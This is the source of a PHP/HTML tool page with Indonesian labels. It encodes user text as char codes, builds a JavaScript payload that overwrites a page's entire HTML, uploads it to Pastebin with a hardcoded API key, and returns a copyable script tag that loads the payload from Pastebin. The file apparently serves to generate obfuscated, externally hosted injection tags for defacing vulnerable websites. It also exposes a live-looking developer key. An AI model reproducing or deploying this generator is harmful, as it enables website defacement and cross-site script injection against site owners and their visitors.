<script>
		function salin_url() {
			document.getElementById("pilih").select();
			document.execCommand("copy");
			swal("Berhasil", "Kode Berhasil Disalin", "success")
		}
	function runCharCodeAt() {
			input = document.charCodeAt.input.value;
			output = "";
			for(i=0; i < input.length; ++i) {
				if (output != "") output += ", ";
				output += input.charCodeAt(i);
			}
			document.charCodeAt.output.value = output;
		}
</script>
<main class="app-content">
	<div class="app-title">
		<div>
          <h1><?= $jenis; ?></h1>
        </div>
        <ul class="app-breadcrumb breadcrumb">
          <a href="<?= base_url() ?>">
          	<li class="breadcrumb-item"><i class="fa fa-home fa-lg"></i></a></li>
          <li class="breadcrumb-item"><?= $title; ?></li>
        </ul>
      </div>
	</div>
	
			<div class="tile">
				<div class="tile-body">
					<form name="charCodeAt" method="post">
		<textarea name="input" class="form-control" placeholder="Place Text In Here!" rows="8"></textarea>
				</div>
			</div>
			
		<div class="tile">
			<input type="submit" onclick="runCharCodeAt()" name="submit" value="Create" class="btn btn-danger btn-block">
		</div>
		<input type="hidden" name="output">
		
<?php 
if (isset($_POST['submit'])) {
	if (empty($_POST['output'])) {
		echo "<script>alert('Text Not Convert');</script>";
	}else{
$kode = $_POST['output'];
$acak = rand(1, 99999999);
$api_dev_key 			= '633fcbdacbff82bfd5dd821a9f8921f7';
$api_pascode 		  = "document.documentElement.innerHTML=String.fromCharCode(".$kode.")";
$api_paspriv 		  = '0';
$api_pasname			= $acak;
$api_ext_date 		= 'N';
$api_pasfor 		  = 'text';
$api_usr_key 			= '';
$api_pasname			= urlencode($api_pasname);
$api_pascode			= urlencode($api_pascode);

$url 				= 'https://pastebin.com/api/api_post.php';

$ch 				= curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_usr_key.'&api_paste_private='.$api_paspriv.'&api_paste_name='.$api_pasname.'&api_paste_expire_date='.$api_ext_date.'&api_paste_format='.$api_pasfor.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_pascode.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1); 
curl_setopt($ch, CURLOPT_NOBODY, 0);

$exec  			= curl_exec($ch);
$hasil = str_replace('https://pastebin.com', 'https://pastebin.com/raw', $exec);
$scan = '<script type="text/javascript" src="'.$hasil.'"></script>';
$echo = htmlspecialchars($scan);
echo "<div class='tile'><input type='text' value='$echo' id='pilih' readonly='readonly' class='form-control mt-2 mb-2 bg-transparent'>";
echo "<button type='button' onclick='salin_url()' class='btn btn-warning btn-block'><i class='fa fa-clone'></i></button></div>";
}}
?>
		
</main>